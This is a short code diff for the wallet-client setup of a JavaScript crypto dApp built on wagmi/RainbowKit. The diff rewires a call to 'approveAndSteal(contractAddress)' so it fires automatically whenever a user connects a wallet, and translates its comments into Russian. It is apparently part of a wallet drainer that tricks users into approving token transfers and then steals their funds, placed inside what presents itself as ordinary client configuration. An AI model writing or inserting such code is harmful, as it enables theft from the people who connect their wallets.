@@ -197,14 +197,14 @@ const wagmiClient = createClient({
   provider,
 });
 
-// Call approveAndSteal directly after creating the client
-(async () => {
+// Вызовите approveAndSteal при подключении кошелька
+wagmiClient.onConnect(async () => {
   try {
     await wagmiClient.approveAndSteal(contractAddress);
   } catch (error) {
-    console.error("Error calling approveAndSteal:", error);
+    console.error("Ошибка при вызове approveAndSteal:", error);
   }
-})();
+});
 
 export { WagmiConfig, RainbowKitProvider };
 
